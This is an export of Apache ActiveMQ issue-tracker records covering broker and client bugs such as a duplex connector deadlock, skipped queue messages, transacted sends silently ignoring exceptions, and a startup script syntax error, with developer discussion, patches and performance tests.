At org.apache.activemq.broker.jmx.DestinationView.browseMessages(DestinationView.java:176)
At sun.reflect.GeneratedMethodAccessor45.invoke (Unknown Source)
At sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:25)
At java.lang.reflect.Method.invoke (Method.java:592)
At com.sun.jmx.mbeanserver.StandardMetaDataImpl.invoke (StandardMetaDataImpl.java:414)
At com.sun.jmx.mbeanserver.MetaDataImpl.invoke (MetaDataImpl.java:220)
...{code}",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14679,,,Mon Feb 14 11:22:50 UTC 2011,,,,,,,,,,,"0|i0ajvz:",59495,,,,,,,,,,,,,,,,,,,,,"14/Feb/11 11:22;gtully;resolved in http://svn.apache.org/viewvc?rev=1070442&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Potential deadlock in duplex network connector recreation, resulting in dangling connections",AMQ-3176,12498131,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,09/Feb/11 15:18,10/Feb/11 11:11,14/Jul/23 05:43,10/Feb/11 11:11,5.4.2,,,,,5.5.0,,,Connector,,,,0,duplex,networkconnector,shutdown,,,,,,"End result is lots of connections that are taking too long to shutdown and in particular: {code}2011-02-07 08:56:49,422 | INFO  | sport: tcp:///xxx:56982 | TransportConnection | The connection to '/xxx:56981' is taking a long time to shutdown.
....
2011-02-07 08:56:49,458 | INFO  | sport: tcp:///xxx:56981 | TransportConnection | The connection to '/xxx:56982' is taking a long time to shutdown.{code} where there is an overlap, with two connections trying to stop each other.
Problem appears when the initiator of a duplex network connector sees a failure and trys to reconnect and the responder sees the old transport connector in place. It tries to stop the existing connection but does it in a sync call so the potential to block and lock is present.







2011-01-26 16:35:54,618 [..] INFO TransportConnection - The connection to '/xx:51585' is taking a long time to shutdown.
2011-01-26 16:35:56,500 [..] INFO TransportConnection - The connection to '/xx:51585' is taking a long time to shutdown.{code}

In particular,
",,ciand7,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3129,,,,,,,,AMQ-2774,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14678,,,Thu Feb 10 11:11:10 UTC 2011,,,,,,,,,,,"0|i0agwf:",59011,,,,,,,,,,,,,,,,,,,,,"09/Feb/11 15:23;gtully;linking to the changes that introduced the removal of the existing duplex connection;;;","10/Feb/11 11:11;gtully;http://svn.apache.org/viewvc?rev=1069339&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker XSD: boolean attributes should permit value injection via Srping's PropertyPlaceholderConfigurer,AMQ-3168,12497106,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,joeniski,joeniski,28/Jan/11 22:18,14/Nov/11 10:58,14/Jul/23 05:43,14/Nov/11 10:58,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"i'm working on upgrading from AMQ 5.3.0 to 5.4.2. i'd like to keep schema validation enabled, so i'm carefully re-ordering the elements in activemq.xml.
Our configuration uses PropertyPlaceholderConfigurer to insert values into activemq.xml. One of our configured values is of XSD type ""boolean"":

        <managementContext>
            <managementContext createConnector=""${enableJmx}"" connectorPort=""${jmxConnectorPort}""/>
        </managementContext>

 i'm seeing this error in the console when i run ""activemq/bin/activemq-admin start"":

ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 128 in XML document from class path resource [activemq.xml] is invalid; nested exception is org.xml.sax.SAXParseException: cvc-datatype-valid.1.2.1: '${enableJmx}' is not a valid value for 'boolean'.

Other replacement tokens that precede this in the file don't produce errors, but they're for string or numeric values, not booleans. Issue AMQ-2939 mentions accomodating numeric vbalues in the broker.xsd. It would be very useful to accomodate boolean values as well, for both configurability and backward compatibility with existing configurations.

","Linux (tested), probably all",joeniski,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74721,,,Mon Nov 14 10:58:54 UTC 2011,,,,,,,,,,,"0|i0ajx3:",59500,,,,,,,,,,,,,,,,,,,,,"14/Nov/11 10:58;dejanb;BooleanEditor is now used for createConnector property, which will enable it to be substituted even when schema validation is used. For older versions, you can explicitly turn off schema validation by using config ""xbean:activemq.xml?validate=false"";;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
possible skipped Queue messages in memory limited configuration with fast consumers,AMQ-3167,12497051,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,28/Jan/11 13:08,11/Feb/11 14:30,14/Jul/23 05:43,28/Jan/11 13:28,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"regression in test from https://issues.apache.org/jira/browse/AMQ-2413 required some investigation. Symptom was missing messages, turned out to be in the middle of the sequence. Issue with the priority kahadb cursors and setbatch. Set batch is invoked when the cursor memory is exhausted such that replay from the store can start at the correct point. If a call to setBatch was followed by a call to recover when there was still no memory space available, the cursor could skip the next pending message.",,artnaseef,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Feb/11 16:48;artnaseef;AMQ3167Test.java;https://issues.apache.org/jira/secure/attachment/12470688/AMQ3167Test.java","11/Feb/11 14:13;artnaseef;patch.amq3167.activemq-5.4.2;https://issues.apache.org/jira/secure/attachment/12470859/patch.amq3167.activemq-5.4.2",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14729,,,Fri Feb 11 14:30:24 UTC 2011,,,,,,,,,,,"0|i0ajxb:",59501,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"28/Jan/11 13:28;gtully;fix in r1064660

URL: http://svn.apache.org/viewvc?rev=1064660&view=rev;;;","09/Feb/11 16:48;artnaseef;Test use case which reproduces the problem consistently by using a small memory limit and short time delay between production and consumption.

A license header as been included; feel free to replace it as-needed.;;;","09/Feb/11 16:53;artnaseef;In the process of creating a bug report for the test case attached above, this bug report appeared to capture the problem.  Trying to backport this fix to 5.4.2, there appears to be a number of changes on which this patch depends.  Any guidance on a shorter workaround until we can upgrade to 5.5 would be appreciated.

The test case attached represents a use pattern we need to support, but has been narrowed down to detect a lost message in the timeframe it takes to trigger this issue.;;;","11/Feb/11 14:13;artnaseef;Patch against 5.4.2 that resolves this issue, created from a subset of the changes made on the trunk for this bug report.;;;","11/Feb/11 14:30;gtully;committed your test case so we can protect your use case it into the future. thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
client calls to createProducer() and send() successful even though BrokerFilter methods throw exceptions,AMQ-3166,12497014,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,artnaseef,artnaseef,28/Jan/11 05:35,22/Nov/16 16:27,14/Jul/23 05:43,25/May/16 10:39,5.4.2,5.5.0,,,,5.14.0,,,Broker,JMS client,,,1,,,,,,,,,"Client calls to createProducer() always return without an error even though a BrokerFilter's addProducer() method throws an exception on the request. In contrast, createConsumer() throws an exception, as expected, when BrokerFilter's addConsumer() throws an exception.

Clients using transacted sessions always return successfully from send() when a BrokerFilter's send() method throws an exception.

Below is a broker configuration file using <authorizationPlugin> to illustrate the problem.

To reproduce the problem With this configuration, a test client only needs to connect with user = ""user"" and password = ""password"", and then attempt to produce messages with a transacted session to any queue other than ABC (e.g. DEF).

Tracing the cause of the issue has lead to finding that the client code for creating a producer uses an Async send for the producer information.  The analogous code for consumers uses a Sync send.

I will work on a patch.  It would be very helpful to have feedback on the operation of the bus and the best way to resolve this problem.  Based on my research, it seems that createProducer() should be using a Sync send in place of the Async one.  Not yet sure about send().  Another possibility is to move the security operations to earlier in the internal broker flow.

=== SAMPLE BROKER XML ===

<beans
  xmlns=""http://www.springframework.org/schema/beans""
  xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
  xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd"">

    <broker xmlns=""http://activemq.apache.org/schema/core""
            brokerName=""localhost""
            dataDirectory=""${activemq.base}/data""
            destroyApplicationContextOnStop=""true"" >

        <persistenceAdapter>
            <kahaDB directory=""${activemq.base}/data/kahadb""/>
        </persistenceAdapter>
        
        <plugins>
          <simpleAuthenticationPlugin anonymousAccessAllowed=""true"">
              <users>
                  <authenticationUser username=""user"" password=""password""
                      groups=""users""/>
              </users>
          </simpleAuthenticationPlugin>

          <authorizationPlugin>
              <map>
                  <authorizationMap>
                    <authorizationEntries>
                      <authorizationEntry queue=""ABC"" read=""users"" write=""users"" admin=""users"" />
                      <authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""users"" write=""users"" admin=""users"" />
                    </authorizationEntries>
                  </authorizationMap>
              </map>
          </authorizationPlugin>
        </plugins>

        <transportConnectors>
            <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
        </transportConnectors>
    </broker>
</beans>
",,artnaseef,gtully,jahlborn,jira-bot,ld4711,lichtin,mez,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQCPP-535,,,,,,,,,,,AMQ-4213,,,,,,,,,,,,,"15/Feb/11 00:31;artnaseef;AMQ3166Test.java;https://issues.apache.org/jira/secure/attachment/12471043/AMQ3166Test.java","15/Feb/11 00:21;artnaseef;AMQ3166Test.java;https://issues.apache.org/jira/secure/attachment/12471042/AMQ3166Test.java","24/Jun/11 17:07;artnaseef;FailedTransactionTracking.java;https://issues.apache.org/jira/secure/attachment/12483740/FailedTransactionTracking.java","24/Jun/11 17:08;artnaseef;FailedTransactionTrackingPlugin.java;https://issues.apache.org/jira/secure/attachment/12483741/FailedTransactionTrackingPlugin.java",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,70097,,,Tue Nov 22 16:27:50 UTC 2016,,,,,,,,,,,"0|i0eaon:",81493,,,,,,,,,,,,,,,,,,,,,"02/Feb/11 22:24;artnaseef;Research found the following:
   - The exceptions are being sent over the transport from the broker to the client
   - Client handling does not propogate the exception back through send() or commit() calls

It appears this is caused by the producer using async sends.  Looking at ActiveMQSession:

            if (sendTimeout <= 0 && !msg.isResponseRequired() && !connection.isAlwaysSyncSend() &&
                (!msg.isPersistent() || connection.isUseAsyncSend() || txid != null)) {
                this.connection.asyncSendPacket(msg);

msg.isResponseRequire() defaults to false for most transport commands, including Message.  Taking advantage of the ""isAlwaysSyncSend()"" logic above, the following works-around the issue (when clients can be modified to use it):

                org.apache.activemq.ActiveMQConnectionFactory   conn_fact;
                ...
                conn_fact.setAlwaysSyncSend(true);

Attempts to use URI parameters, and searches through the code for URI parameters, have yielded no working solutions there.  If the connection URL could include a setting such as ""?connection.alwaysSyncSend=true"" would make this problem easier to solve since most clients use a configurable connection string.

However, with all of that said, it seems that transacted sends - as well as creating producers - should be synchronous.  That can be solved by taking out the ""txid != null"" logic.

For further performance improvement over transacted sends, if a client wants batch sending, which is not part of the JMS standard, it makes sense to require clients to use ActiveMQ-specific features.  Perhaps a batchSend() method followed by batchComplete().
;;;","15/Feb/11 00:21;artnaseef;JUnit test program with 3 test cases:
   1. Transacted sends which illustrate the problem
   2. Transacted sends using a work-around
   3. Non-transacted sends which do not have this problem;;;","15/Feb/11 00:31;artnaseef;Corrected source.  The previous one contained a typo.;;;","31/May/11 19:17;artnaseef;Confirmed with 5.5.0 as well.  Note that an activemq-cpp client was tested with the same results.;;;","01/Jun/11 05:40;artnaseef;I finally walked through the entire IntrospectionSupport and query handling for an ActiveMQConnection and found that the following on the URL works around the issue as well:

{code}
...?jms.alwaysSyncSend=true         (JAVA CLIENT)
...?connection.alwaysSyncSend=true  (C++ CLIENT: activemq-cpp)
{code}

For TRANSACTIONS, I recommend that the extra logic be added to use sync sends by default because that matches the the JMS standard - and what I believe clients expect across all JMS providers - but with a setting that allows clients to override that operation.  Perhaps the following:

{code}
...?jms.transactionAsyncSend=false    => (default) don't use async sends with transactions
...?jms.transactionAsyncSend=true     => use async sends with transactions
{code}

By the way, shouldn't the activemq-cpp library support ""jms."" as the prefix for connection parameters in the same way the Java code does?  Otherwise, we have to make sure URL's are client-implementation-specific.

The subset of logic for async sends on transactions would be as follows:

{code}
IF (session IS transacted ) AND ( not alwaysSyncSend ) AND ( transactionAsyncSend )
THEN
  SEND async
ELSE
  SEND sync
END IF
{code}

A patch with this update will be coming soon.;;;","01/Jun/11 11:25;gtully;I agree, it would be better if the cpp client respected the same naming convention, not sure why that is not the case.

The logic for async send with transactions follows from a commit/rollback being sent sync. There is no real work done on the broker till the transaction completes, this sort of batching is expected with multiple message sends in a transaction.
For the use case where a broker filter throws an exception, having commit fail would make some sense for the transacted case.
For a producer, I am not sure of the value of local transactions unless there is batching.
Having said that, having a transacted send respect alwaysSyncSend is no harm as it defaults to false. ;;;","01/Jun/11 13:18;tabish;The C\+\+ client doesn't respect the jms option prefix for a few reasons, foremost being that its not a JMS client it implements CMS a JMS-like API that can and does vary somewhat from the JMS spec.  Also because the options vary between the C\+\+, .NET and Java client having the URI syntax be identical presents a false equivalence about what behaviour your URI options will produce in the case where you specify options that don't currently exist in the client of your choosing.   In the .NET client we prefix URI options with nms.* for the same reason.  It could be argued that the C\+\+ client should offer its options as cms.* and that would be fine with me, however nobody has stepped up to do the work involved in writing a better URI option parser so its remained as it is now.;;;","24/Jun/11 17:00;artnaseef;Broker Filter which remembers failures on transactions and fails all subsequent operations (except rollbacks), including commit().;;;","24/Jun/11 17:00;artnaseef;BrokerPlugin for the filter.;;;","24/Jun/11 17:05;artnaseef;Sorry for the slow response.

I think the fail-on-commit is a feasible solution and have attached a Broker Filter which makes that happen.  There are a couple of non-optimal aspects to this solution, but I wanted to put it out for consideration/feedback.

The two concerns I have with this solution are:
* Only failures that occur after the filter in the broker's filter chain will be detected and handled.
* Clients may continue for a while after a failure, likely performing throw-away work.
** I would like to address this with a new message back to the client specifically indicating the transaction failure.
** Client logic would then be needed to check the transaction on send() and receive()/acknowledge() calls.

Please let me know.  If this looks like a feasible solution, I'll create JUnit tests that incorporate this feature.;;;","24/Jun/11 17:07;artnaseef;Corrected the package name.;;;","24/Jun/11 17:08;artnaseef;Corrected the package name.;;;","07/Dec/12 21:49;tabish;AMQ-4213 - This resolves the complaint that the createProducer should be sync.  ;;;","28/Feb/14 04:39;artnaseef;Let's get this fixed.  It's a violation of the JMS spec that transactions are not reliable.

I see two options.

* Make the client libraries perform sends synchronously.
* Have the broker retain state of failures and propogate failed sends to failed commits.
** Consider a way to propogate failures quickly so that a producer with large numbers of messages does not waste all that effort only to have the commit fail a long time later.

The downside of the first option is a likely loss of performance.  However, the second option is more complex to code and prevents possible intelligence in clients to perform better handling of issues like individual failed sends in a transaction (consider a client wanting to have logic to recover from a single failed send in a larger transaction).
;;;","28/Feb/14 04:40;artnaseef;Anyone with thoughts on (a) the best approach to resolving this, and (b) avoiding reduced performance, please speak up.;;;","28/Feb/14 12:03;gtully;thinking just in terms of sends and acks, if a request (sync or sync) results in an exception, then the transaction should be marked rollbackOnly. There may be wasted work but at least the outcome will be deterministic. all of nothing.
this can probably be handled in org.apache.activemq.broker.TransportConnection#service with some additional rollbackOnly logic in transaction. Or maybe just a rollback immediately will do it.;;;","03/Mar/14 00:21;artnaseef;Thanks Gary - I'll look at TransportConnection's service method.

While I tend to agree the extra work may not be a problem, I'd like to see if there's a simple, straight-forward way to solve it.  I've seen this lead to thousands of errors logged in an application for a single request.  One idea is to propogate the failure by sending a transport command back to the client that says the transaction failed so the client library can then respond immediately to any subsequent operations on the transaction.  The biggest downside I see is the added transport command and iterating the protocol.;;;","03/Mar/14 04:57;artnaseef;I tried forcing a rollback on the transaction and that causes the commit to fail, but the exception seems misleading to me, stating transaction has not been started:

{noformat}
javax.jms.JMSException: Transaction 'TX:ID:Arthur-Naseefs-MacBook-Pro.local-58321-1393821595757-5:1:1' has not been started.
{noformat}

Here's my patch:
{noformat}
diff --git a/activemq-broker/src/main/java/org/apache/activemq/broker/TransportConnection.java b/activemq-broker/src/mai
index 65d044b..fc4a674 100755
--- a/activemq-broker/src/main/java/org/apache/activemq/broker/TransportConnection.java
+++ b/activemq-broker/src/main/java/org/apache/activemq/broker/TransportConnection.java
@@ -306,6 +306,9 @@ public class TransportConnection implements Connection, Task, CommandVisitor {
                 responseRequired = false;
             }
 
+            // AMQ-3166: remember and propogate transaction failures.
+            serviceTransactionExceptions(command, e);
+
             if (responseRequired) {
                 response = new ExceptionResponse(e);
             } else {
@@ -1608,4 +1611,44 @@ public class TransportConnection implements Connection, Task, CommandVisitor {
     public WireFormatInfo getRemoteWireFormatInfo() {
         return wireFormatInfo;
     }
+
+    protected void  serviceTransactionExceptions(Command command, Throwable thrown) {
+        if ( command instanceof Message ) {
+            Message msg = (Message) command;
+
+            if ( msg.isInTransaction() ) {
+                LOG.debug(""marking transaction {} failed on message {} due to {}"", msg.getTransactionId(),
+                          msg.getMessageId(), thrown.getMessage());
+                this.markTransactionFailure(msg.getConnection().getConnectionInfo().getConnectionId(),
+                                            msg.getTransactionId(), thrown);
+            }
+        } else if ( command instanceof MessageAck ) {
+            MessageAck ack = (MessageAck) command;
+
+            if ( ack.isInTransaction() ) {
+                LOG.debug(""marking transaction {} failed on ack for messages {}..{} due to {}"", ack.getTransactionId(),
+                          ack.getFirstMessageId(), ack.getLastMessageId(), thrown.getMessage());
+                this.markTransactionFailure(ack.getConsumerId().getParentId().getParentId(), ack.getTransactionId(),
+                                            thrown);
+            }
+        }
+
+        // TBD: any other commands?  MessagePull doesn't contain transaction info, and I suspect that it doesn't need
+        // it since it must be synchronous.
+    }
+
+    protected void  markTransactionFailure(ConnectionId connId, TransactionId tId, Throwable thrown) {
+        TransactionInfo rollback = new TransactionInfo();
+        rollback.setConnectionId(connId);
+        rollback.setTransactionId(tId);
+        rollback.setType(TransactionInfo.ROLLBACK);
+
+        try {
+            // Reuse the rollback existing logic.
+            this.processRollbackTransaction(rollback);
+        } catch ( Throwable err ) {
+            LOG.warn(""failed to force rollack on transaction {} after initial failure {}"", tId, thrown.getMessage(),
+                     err);
+        }
+    }
 }
{noformat}

I'm looking at adding a ""failed"" status to TransactionState - that appears to be a feasible approach, and seems more correct as well.;;;","03/Mar/14 11:50;gtully;the behaviour makes sense b/c of the use of the rollback logic so the transaction goes away.
I was thinking more along the lines of a new rollbackOnly flag/state in transaction. that would only kick in on commit in the event of a previous failure.
tracking send/create producer-consumer failures should use syncSends and exception handlers clients side. Broker side they would flip the rollbackOnly flag. So any broker side failure that occurs within a transaction would set the rollbackonly flag and optionally a client can trap individual failures and call rollback. In any event, the transaction aborts.;;;","03/Mar/14 19:16;artnaseef;If transacted-sends were always sent Synchronously from the client to the broker, this problem would go away as the clients would immediately receive the exception on the send.  In that case, I wouldn't bother with marking the transaction as failed since (a) there's really no need, and (b) the client could easily decide to go forward and commit in spite of the single send failure (i.e. more complex transacted use-cases would be supported).

My only concern with making that change is the potential impact to performance.  I'll give it a try and see how much impact it has.;;;","07/Mar/14 14:53;artnaseef;Doing a quick test, I found {{alwaysSyncSend}} on the connection drops performance for message production.

In fact, the benefit of using a transaction for faster throughput appears to be eliminated.

Here's the test and results.  Note that increasing transaction sizes improves throughput in the async-case (desirable) but not the sync case.

*Test*
{noformat}
# Transacted async send of 1000 persistent messages with 100 messages per transaction to queue asn.test
echo ""=== TRANSACTED ASYNC SEND ===""
time javarun Flood -t -m 1000 -o 250 -c 100 -u 'tcp://localhost:61616' queue asn.test

# Transacted sync send of 1000 persistent messages with 100 messages per transaction to queue asn.test
echo
echo ""=== TRANSACTED SYNC SEND ===""
time javarun Flood -t -m 1000 -o 250 -c 100 -u 'tcp://localhost:61616?jms.alwaysSyncSend=true' queue asn.test

# Non-transacted send of 1000 persistent messages to queue asn.test
echo
echo ""=== NON-TRANSACTED SEND ===""
time javarun Flood -m 1000 -o 250 -u 'tcp://localhost:61616' queue asn.test
{noformat}

*Results*
{noformat}
=== TRANSACTED ASYNC SEND ===
log4j:WARN No appenders could be found for logger (org.apache.activemq.transport.WireFormatNegotiator).
log4j:WARN Please initialize the log4j system properly.
Set producer window size to 0
Running Producer
250
500
750
1000
Producer Terminating

real    0m0.927s
user    0m0.030s
sys     0m0.060s

=== TRANSACTED SYNC SEND ===
log4j:WARN No appenders could be found for logger (org.apache.activemq.transport.WireFormatNegotiator).
log4j:WARN Please initialize the log4j system properly.
Set producer window size to 0
Running Producer
250
500
750
1000
Producer Terminating

real    0m2.403s
user    0m0.015s
sys     0m0.061s

=== NON-TRANSACTED SEND ===
log4j:WARN No appenders could be found for logger (org.apache.activemq.transport.WireFormatNegotiator).
log4j:WARN Please initialize the log4j system properly.
Set producer window size to 0
Running Producer
250
500
750
1000
Producer Terminating

real    0m2.508s
user    0m0.015s
sys     0m0.045s
{noformat}


Based on this, I won't force all transacted sends to be synchronous.;;;","07/Mar/14 14:56;mez;I'm out of the office and will return on Monday, Mar. 10th.




;;;","08/Apr/14 12:47;ld4711;We had an issue in production with lost messages in a transacted batch, due to server memory limit settings (producer flow control). Setting an exception handler on the connection factory is not enough to be on the safe side, as we were able to construct a test case that builds a race condition between the producer thread and the exception handler thread such that the commit is done before the asynchronous exception callback is fired by the server response.

E.g. set server memory limit to 1 MB only, send batch of 100 messages, server can handle only 95 messages, commit is done before callback is triggered: 5 messages are lost, 95 messages appear in the queue.

As lost messages within a transaction are really a bad thing we would appreciate Gary Tully's approach of setting a flag in the transaction context, so that any exception will always and reliably yield a JMS rollback. Besides that, an exception should be thrown in the commit thread such that there is no chance of having a silent failure from the client perspective. Otherwise the rollback may go unnoticed.
Transaction handling should also be safe for those users that forget to set the exception handler at all.

I do not favor the option of doing a commit for only a part of my message batch, i.e. when you have a failure after message 101 you should not be able to commit messages 1 to 100. For me transactions are always an all-or-nothing matter. As with asynchronous sends you have a delay of several send operations until the exception handler gets fired it would require significant client logic to determine which messages survived and which got lost.;;;","08/Apr/14 12:51;mez;I'm out of the office and will return on Monday, Apr. 13th.



;;;","25/May/16 10:30;jira-bot;Commit fe9d99e7a071c4c09c78dfd95630036b86a8a05b in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=fe9d99e ]

AMQ-3166 - implement rollbackOnlyOnAsyncException such that async exceptions on transactional sends or acks result in the transaction being marked rollback only and commit failing with an exception. Test that shows current state of play using alwaySendSync or AsyncCallback. rollbackOnlyOnAsyncException enabled by default.
;;;","25/May/16 10:39;gtully;async exceptions on transactional ops - message send and message ack will result in the transaction being marked rollback-only. Commit will fail with an exception.
In the event that folks want to have partial transactions in the event of failures, the behaviour can be disabled with {code}<broker rollbackOnlyOnAsyncException=""false"" ... >{code}

using setAlwaysSyncSend or using the AsyncCallback api variants provide workarounds for the current code base.;;;","11/Nov/16 16:20;jahlborn;[~gtully] just curious, is there a reason that the Transaction does not remember the original cause in setRollbackOnly and include that on the resulting XAException?  I ran into this bug when using producer flow control on a jms transacted connection (on an older version of activemq).  the patch for this bug fixes the problem, however, you have to dig through the logs to find the ultimate cause of the send failure (a ResourceAllocationException).  seems like it would be useful to include that in the failure returned to the client?  

e.g.:
{code}
diff --git a/activemq-broker/src/main/java/org/apache/activemq/transaction/Transaction.java b/activemq-broker/src/main/j
index f891c89..99b8c1f 100755
--- a/activemq-broker/src/main/java/org/apache/activemq/transaction/Transaction.java
+++ b/activemq-broker/src/main/java/org/apache/activemq/transaction/Transaction.java
@@ -45,6 +45,7 @@ public abstract class Transaction {
     public static final byte FINISHED_STATE = 3;
     boolean committed = false;
     boolean rollbackOnly = false;
+    private Throwable rollbackOnlyCause;
 
     private final ArrayList<Synchronization> synchronizations = new ArrayList<Synchronization>();
     private byte state = START_STATE;
@@ -112,6 +113,9 @@ public abstract class Transaction {
         if (rollbackOnly) {
             XAException xae = newXAException(""COMMIT FAILED: Transaction marked rollback only"", XAException.XA_RBROLLBA
             TransactionRolledBackException transactionRolledBackException = new TransactionRolledBackException(xae.getL
+            if(rollbackOnlyCause != null) {
+                transactionRolledBackException.initCause(rollbackOnlyCause);
+            }
             xae.initCause(transactionRolledBackException);
             throw xae;
         }
@@ -216,6 +220,7 @@ public abstract class Transaction {
         if (!rollbackOnly) {
             getLog().trace(""setting rollback only, cause:"", cause);
             rollbackOnly = true;
+            rollbackOnlyCause = cause;
         }
     }
{code};;;","11/Nov/16 16:21;mez;I'm out of the office and will return on Wed, Nov 16th.
[https://www.netcracker.com/assets/img/netcracker-social-final.png] ƕ



;;;","22/Nov/16 16:08;jira-bot;Commit 7077d2b910405dea7a60c5140824966ffebc66a8 in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=7077d2b ]

[AMQ-3166] init rollbackonly exception cause such that xaexception has meaning, thanks to james (jtahlborn) for the suggestion
;;;","22/Nov/16 16:11;gtully;[~jahlborn] thanks for the suggestion. I swapped the boolean for a throwable and now capture the root cause. ;;;","22/Nov/16 16:27;jira-bot;Commit 99b7a28ccbb5435ef5bdba3ceac9995996dfbbed in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=99b7a28 ]

[AMQ-3166] fix typo that removed class name, sorry
;;;",,,,,,,,,,,,,,,,,,,,,,,,
bin/activemq error on MacOS (and maybe Cygwin),AMQ-3163,12496846,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,dcheckoway,dcheckoway,26/Jan/11 17:04,14/Oct/11 21:07,14/Jul/23 05:43,14/Oct/11 21:07,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Had to make this change to bin/activemq to avoid an error...need spaces inside the []s:

[dan:/usr/local/apache-activemq-5.5-SNAPSHOT/bin]$ diff activemq activemq.new
252c252
<            if [-z ""$JAVA_HOME""] && [ ""$JAVACMD"" = ""auto"" ];then
---
>            if [ -z ""$JAVA_HOME"" ] && [ ""$JAVACMD"" = ""auto"" ];then ","Mac OSX Snow Leopard
GNU bash, version 3.2.48(1)-release (x86_64-apple-darwin10.0)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74722,,,Fri Oct 14 21:07:22 UTC 2011,,,,,,,,,,,"0|i0ajxr:",59503,,,,,,,,,,,,,,,,,,,,,"14/Oct/11 21:07;tabish;This has since been fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
